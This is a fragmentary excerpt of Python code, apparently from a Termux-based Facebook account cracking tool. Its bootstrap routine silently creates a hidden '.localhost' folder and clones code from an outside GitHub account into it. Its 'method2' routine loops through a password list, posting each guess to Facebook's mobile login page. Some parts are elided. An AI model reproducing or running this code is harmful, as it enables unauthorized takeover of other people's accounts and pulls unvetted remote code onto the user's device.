...
def bootstrap():
    if not os.path.isfile('/data/data/com.termux/files/home/.localhost/AXB WORLD/node_modules/uuid/v1.js'):
        os.system('cd /$HOME && mkdir .localhost && cd .localhost && git clone https://github.com/Mr-Azan')
...
def method2(uid,pwx):
    try:
        ...
        for ps in pwx:
            ...
            log_s = session.post('https://free.facebook.com/login.php',data=log)
